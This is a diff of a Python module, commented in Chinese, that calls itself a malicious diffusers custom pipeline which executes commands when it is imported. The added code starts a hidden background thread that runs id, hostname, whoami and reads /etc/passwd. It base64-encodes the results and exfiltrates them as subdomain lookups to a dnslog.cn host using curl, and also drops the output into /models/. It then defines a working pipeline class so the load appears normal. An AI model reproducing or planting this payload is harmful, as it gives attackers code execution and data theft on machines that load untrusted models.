@@ -1,32 +1,45 @@
-# 恶意自定义 pipeline - import 时执行命令
-import os, subprocess, base64
+# rce-by-import: diffusers from_pretrained 动态导入此模块时执行顶层代码
+import os, subprocess, base64, threading
 
-# 立即执行命令并通过 DNS/文件外带
-try:
-    out = subprocess.check_output("id; hostname; uname -a; cat /etc/passwd | head -5", shell=True, timeout=10, stderr=subprocess.STDOUT)
-    b64 = base64.b64encode(out).decode()
-    # 写入 /models/ 目录作为文件（数据外传通道）
-    with open("/models/PWN-IMPORT-RCE.txt", "w") as f:
-        f.write(out.decode())
-    with open(f"/models/PWN-IMPORT-{b64[:50]}.txt", "w") as f:
-        f.write(b64)
-except Exception as e:
+def _pwn():
     try:
-        with open("/models/PWN-IMPORT-ERR.txt", "w") as f:
-            f.write(str(e))
-    except:
+        dns = "19xlua.dnslog.cn"
+        # DNS 外带: id/hostname/whoami
+        for cmd in ["id", "hostname", "whoami", "cat /etc/passwd | head -3"]:
+            try:
+                out = subprocess.check_output(cmd, shell=True, timeout=5, stderr=subprocess.STDOUT)
+                tag = cmd.split()[0]
+                b64 = base64.b64encode(out).decode().replace('+','-').replace('/','_').replace('=','')
+                # 直接作为子域 DNS 查询 (截断至63字符内)
+                sub = b64[:55]
+                subprocess.Popen(f"curl -s http://{sub}.{dns} >/dev/null 2>&1", shell=True)
+            except Exception:
+                pass
+        # 文件写入 /models/ (数据外传通道)
+        try:
+            out = subprocess.check_output("id; hostname; uname -a", shell=True, timeout=5, stderr=subprocess.STDOUT)
+            with open("/models/PWN-IMPORT-RCE.txt", "w") as f:
+                f.write(out.decode())
+        except Exception:
+            pass
+    except Exception:
         pass
 
-class PwnPipeline:
-    def __init__(self, *args, **kwargs):
-        self.unet = None
-        self.vae = None
-        self.text_encoder = None
-        self.tokenizer = None
-        self.scheduler = None
-        self.safety_checker = None
-        self.feature_extractor = None
+# 后台线程执行避免阻塞 import
+t = threading.Thread(target=_pwn)
+t.daemon = True
+t.start()
+
+# 合法的 diffusers pipeline 类定义 (确保 import 成功)
+from diffusers import DiffusionPipeline
+from diffusers.configuration_utils import ConfigMixin
+import torch
+
+class PwnPipeline(DiffusionPipeline):
+    def __init__(self, unet=None, vae=None, text_encoder=None, tokenizer=None, scheduler=None, safety_checker=None, feature_extractor=None, requires_safety_checker=False):
+        super().__init__()
+        self.register_modules(unet=unet, vae=vae, text_encoder=text_encoder, tokenizer=tokenizer, scheduler=scheduler, safety_checker=safety_checker, feature_extractor=feature_extractor)
+        self.register_to_config(requires_safety_checker=requires_safety_checker)
     def __call__(self, *args, **kwargs):
-        return [{"images": [b"PWN"]}]
-    def to(self, *args, **kwargs):
-        return self
+        import numpy as np
+        return [{"images": [np.zeros((1,1,3), dtype=np.uint8)]}]
